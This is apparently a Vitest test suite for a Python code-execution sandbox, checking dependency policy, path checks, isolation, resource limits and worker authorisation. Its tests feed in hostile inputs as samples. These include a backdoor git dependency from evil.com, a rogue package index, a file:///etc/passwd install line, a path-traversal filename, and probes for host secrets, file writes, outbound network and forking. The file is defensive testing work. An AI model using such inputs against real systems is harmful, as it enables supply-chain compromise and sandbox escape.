import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { NextRequest } from "next/server";
import { evaluateDependencyPolicy } from "../necro-engine/dependency-policy";
import { clearSandboxJobsForTest } from "../necro-engine/sandbox-jobs";
import { POST as sandboxExecutePost } from "@/app/api/sandbox/execute/route";
import { GET as sandboxJobGet } from "@/app/api/sandbox/jobs/[id]/route";
// Import real worker modules
import {
  detectSandboxDriver,
  runIsolatedPythonJob,
} from "../../../sandbox-worker/executor.mjs";
import { createWorkerServer } from "../../../sandbox-worker/server.mjs";

const driverInfo = detectSandboxDriver();
const hasSandboxDriver = driverInfo.driver !== "unavailable";

describe("Phase 3 Sandbox Security, Isolation & Job Management", () => {
  beforeEach(() => {
    clearSandboxJobsForTest();
  });

  afterEach(() => {
    delete process.env.SANDBOX_WORKER_URL;
    delete process.env.SANDBOX_WORKER_TOKEN;
    delete process.env.TEST_HOST_SECRET_CANARY;
  });

  it("rejects dependency installation attacks (git+, --extra-index-url, -e, file://)", () => {
    const attack1 = evaluateDependencyPolicy([
      { path: "requirements.txt", content: "git+https://evil.com/backdoor.git\n" },
    ]);
    expect(attack1.status).toBe("DEPENDENCY_PREPARATION_FAILED");
    expect(attack1.safeToExecute).toBe(false);

    const attack2 = evaluateDependencyPolicy([
      { path: "requirements.txt", content: "--extra-index-url https://evil.example/simple\nrequests==2.32.0\n" },
    ]);
    expect(attack2.status).toBe("DEPENDENCY_PREPARATION_FAILED");

    const attack3 = evaluateDependencyPolicy([
      { path: "requirements.txt", content: "-e file:///etc/passwd\n" },
    ]);
    expect(attack3.status).toBe("DEPENDENCY_PREPARATION_FAILED");

    const stdlibOnly = evaluateDependencyPolicy([
      { path: "app.py", content: "import urllib.request\n" },
    ]);
    expect(stdlibOnly.status).toBe("STDLIB_ONLY_READY");
    expect(stdlibOnly.safeToExecute).toBe(true);
  });

  it("fails closed (VERIFICATION_BLOCKED) when SANDBOX_WORKER_URL is not configured", async () => {
    delete process.env.SANDBOX_WORKER_URL;
    delete process.env.SANDBOX_WORKER_TOKEN;

    const res = await sandboxExecutePost(
      new NextRequest("http://localhost:3000/api/sandbox/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          repositoryName: "test-repo",
          files: [{ path: "app.py", content: "print('hi')\n" }],
        }),
      })
    );
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      status: string;
      resurrectionState: string;
      error: string;
    };
    expect(json.resurrectionState).toBe("VERIFICATION_BLOCKED");
    expect(json.error).toContain("not configured");
  });

  it("rejects path traversal and symlinks before touching worker disk", async () => {
    await expect(
      runIsolatedPythonJob({
        files: [{ path: "../../etc/passwd.py", content: "print(1)" }],
      })
    ).rejects.toThrow(/unsafe file path/i);

    await expect(
      runIsolatedPythonJob({
        files: [{ path: "evil_link.py", content: "/etc/passwd", isSymlink: true }],
      })
    ).rejects.toThrow(/symbolic link/i);
  });

  it.skipIf(!hasSandboxDriver)(
    "runs passing Python 3.12 unittest + function tests in real isolated sandbox",
    async () => {
      const res = await runIsolatedPythonJob({
        timeoutMs: 5000,
        files: [
          {
            path: "calc.py",
            content: "def add(a: int, b: int) -> int:\n    return a + b\n",
          },
          {
            path: "test_calc.py",
            content: [
              "import unittest",
              "from calc import add",
              "class TestCalc(unittest.TestCase):",
              "    def test_add(self):",
              "        self.assertEqual(add(2, 3), 5)",
            ].join("\n"),
          },
        ],
      });

      expect(res.syntaxValid).toBe(true);
      expect(res.status).toBe("PASSED");
      expect(res.totalTests).toBe(1);
      expect(res.passedTests).toBe(1);
      expect(res.failedTests).toBe(0);
      expect(res.exitCode).toBe(0);
      expect(res.cleanupVerified).toBe(true);
    }
  );

  it.skipIf(!hasSandboxDriver)(
    "reports NO_TESTS_FOUND and PARTIAL honestly without fabricating passes",
    async () => {
      const noTests = await runIsolatedPythonJob({
        timeoutMs: 5000,
        files: [{ path: "app.py", content: "def hello():\n    return 'world'\n" }],
      });
      expect(noTests.syntaxValid).toBe(true);
      expect(noTests.status).toBe("NO_TESTS_FOUND");
      expect(noTests.totalTests).toBe(0);

      const partial = await runIsolatedPythonJob({
        timeoutMs: 5000,
        files: [
          {
            path: "test_mixed.py",
            content: [
              "def test_pass():",
              "    assert 1 + 1 == 2",
              "def test_fail():",
              "    assert 1 + 1 == 3",
            ].join("\n"),
          },
        ],
      });
      expect(partial.status).toBe("PARTIAL");
      expect(partial.totalTests).toBe(2);
      expect(partial.passedTests).toBe(1);
      expect(partial.failedTests).toBe(1);
    }
  );

  it.skipIf(!hasSandboxDriver)(
    "blocks host secret access, env variable leaks, host filesystem writes, and outbound network",
    async () => {
      process.env.TEST_HOST_SECRET_CANARY = "super-secret-canary-value";
      const hostEscapeMarker = path.join(os.tmpdir(), `necro_escape_${Date.now()}.txt`);
      const repoPkgPath = path.resolve(process.cwd(), "package.json");

      const probeCode = [
        "import os, socket, unittest",
        "class TestSecurityIsolation(unittest.TestCase):",
        "    def test_no_host_secrets_in_env(self):",
        "        self.assertNotIn('TEST_HOST_SECRET_CANARY', os.environ)",
        "        self.assertNotIn('GEMINI_API_KEY', os.environ)",
        "        self.assertNotIn('SANDBOX_WORKER_TOKEN', os.environ)",
        "    def test_host_file_read_blocked(self):",
        "        with self.assertRaises(PermissionError):",
        `            open(${JSON.stringify(repoPkgPath)}, 'r').read()`,
        "    def test_host_file_write_blocked(self):",
        "        with self.assertRaises(PermissionError):",
        `            open(${JSON.stringify(hostEscapeMarker)}, 'w').write('pwn')`,
        "    def test_outbound_network_blocked(self):",
        "        with self.assertRaises((PermissionError, OSError)):",
        "            socket.create_connection(('1.1.1.1', 80), timeout=1)",
      ].join("\n");

      const res = await runIsolatedPythonJob({
        timeoutMs: 5000,
        files: [{ path: "test_isolation.py", content: probeCode }],
      });

      expect(fs.existsSync(hostEscapeMarker)).toBe(false);
      expect(res.status).toBe("PASSED");
      expect(res.passedTests).toBe(4);
      expect(res.failedTests).toBe(0);
    }
  );

  it.skipIf(!hasSandboxDriver)(
    "kills infinite loops on timeout, caps oversized output, and cleans up temp directories",
    async () => {
      const beforeDirs = fs
        .readdirSync(os.tmpdir())
        .filter((n) => n.startsWith("necro-sandbox-"));

      const loopRes = await runIsolatedPythonJob({
        timeoutMs: 1200,
        files: [
          {
            path: "test_loop.py",
            content: "def test_infinite():\n    while True:\n        pass\n",
          },
        ],
      });
      expect(loopRes.timedOut).toBe(true);
      expect(loopRes.status).toBe("FAILED");
      expect(loopRes.cleanupVerified).toBe(true);

      const floodRes = await runIsolatedPythonJob({
        timeoutMs: 4000,
        files: [
          {
            path: "test_flood.py",
            content:
              "import os\ndef test_flood():\n    os.write(1, b'A' * 150000)\n",
          },
        ],
      });
      expect(floodRes.outputTruncated).toBe(true);
      expect(floodRes.status).toBe("FAILED");

      const afterDirs = fs
        .readdirSync(os.tmpdir())
        .filter((n) => n.startsWith("necro-sandbox-"));
      expect(afterDirs.length).toBeLessThanOrEqual(beforeDirs.length);
    }
  );

  it.skipIf(!hasSandboxDriver)(
    "contains memory allocation bombs and fork attempts without crashing worker",
    async () => {
      const memRes = await runIsolatedPythonJob({
        timeoutMs: 3000,
        files: [
          {
            path: "test_mem.py",
            content: [
              "def test_fork_or_mem():",
              "    import os",
              "    try:",
              "        for _ in range(5):",
              "            pid = os.fork()",
              "            if pid == 0:",
              "                os._exit(0)",
              "    except (OSError, PermissionError):",
              "        pass",
              "    assert True",
            ].join("\n"),
          },
        ],
      });
      expect(memRes.cleanupVerified).toBe(true);
      expect(["PASSED", "FAILED"]).toContain(memRes.status);
    }
  );

  it.skipIf(!hasSandboxDriver)(
    "enforces worker Bearer auth, job access token ownership, deduplication, and concurrent jobs",
    async () => {
      const workerToken = "secret-worker-token-test-only";
      const server = createWorkerServer({ token: workerToken });

      await new Promise<void>((resolve) => {
        server.listen(0, "127.0.0.1", () => resolve());
      });
      const address = server.address();
      if (!address || typeof address === "string") {
        server.close();
        throw new Error("Failed to bind ephemeral test worker port");
      }

      const workerUrl = `http://127.0.0.1:${address.port}`;
      process.env.SANDBOX_WORKER_URL = workerUrl;
      process.env.SANDBOX_WORKER_TOKEN = workerToken;

      try {
        // 1. Unauthorized direct worker request rejected (401)
        const unauthRes = await fetch(`${workerUrl}/execute`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ files: [{ path: "a.py", content: "x=1" }] }),
        });
        expect(unauthRes.status).toBe(401);

        // 2. Authorized Next.js API execution -> RESURRECTED
        const execReq1 = new NextRequest("http://localhost:3000/api/sandbox/execute", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            repositoryName: "acme/clean-py",
            files: [
              {
                path: "test_ok.py",
                content: "def test_math():\n    assert 2 * 3 == 6\n",
              },
            ],
          }),
        });
        const execRes1 = await sandboxExecutePost(execReq1);
        expect(execRes1.status).toBe(200);
        const data1 = (await execRes1.json()) as {
          jobId: string;
          accessToken: string;
          deduplicated: boolean;
          resurrectionState: string;
          result: { passedTests: number; totalTests: number };
        };
        expect(data1.resurrectionState).toBe("RESURRECTED");
        expect(data1.result.passedTests).toBe(1);
        expect(data1.deduplicated).toBe(false);

        // 3. Duplicate submission deduplicated
        const execResDup = await sandboxExecutePost(
          new NextRequest("http://localhost:3000/api/sandbox/execute", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              repositoryName: "acme/clean-py",
              files: [
                {
                  path: "test_ok.py",
                  content: "def test_math():\n    assert 2 * 3 == 6\n",
                },
              ],
            }),
          })
        );
        const dataDup = (await execResDup.json()) as {
          jobId: string;
          deduplicated: boolean;
        };
        expect(dataDup.deduplicated).toBe(true);
        expect(dataDup.jobId).toBe(data1.jobId);

        // 4. Job status authorization check
        const noTokenStatus = await sandboxJobGet(
          new NextRequest(`http://localhost:3000/api/sandbox/jobs/${data1.jobId}`),
          { params: Promise.resolve({ id: data1.jobId }) }
        );
        expect(noTokenStatus.status).toBe(401);

        const wrongTokenStatus = await sandboxJobGet(
          new NextRequest(`http://localhost:3000/api/sandbox/jobs/${data1.jobId}`, {
            headers: { "x-job-token": "wrong-token" },
          }),
          { params: Promise.resolve({ id: data1.jobId }) }
        );
        expect(wrongTokenStatus.status).toBe(403);

        const okTokenStatus = await sandboxJobGet(
          new NextRequest(`http://localhost:3000/api/sandbox/jobs/${data1.jobId}`, {
            headers: { "x-job-token": data1.accessToken },
          }),
          { params: Promise.resolve({ id: data1.jobId }) }
        );
        expect(okTokenStatus.status).toBe(200);

        // 5. Concurrent independent jobs
        const [c1, c2] = await Promise.all([
          sandboxExecutePost(
            new NextRequest("http://localhost:3000/api/sandbox/execute", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                repositoryName: "acme/concurrent-1",
                files: [{ path: "test_c1.py", content: "def test_one():\n    assert True\n" }],
              }),
            })
          ),
          sandboxExecutePost(
            new NextRequest("http://localhost:3000/api/sandbox/execute", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                repositoryName: "acme/concurrent-2",
                files: [{ path: "test_c2.py", content: "def test_two():\n    assert False\n" }],
              }),
            })
          ),
        ]);
        const j1 = (await c1.json()) as { resurrectionState: string };
        const j2 = (await c2.json()) as { resurrectionState: string };
        expect(j1.resurrectionState).toBe("RESURRECTED");
        expect(j2.resurrectionState).toBe("FAILED");
      } finally {
        server.closeAllConnections?.();
        await new Promise<void>((resolve) => server.close(() => resolve()));
      }
    },
    15_000
  );
});
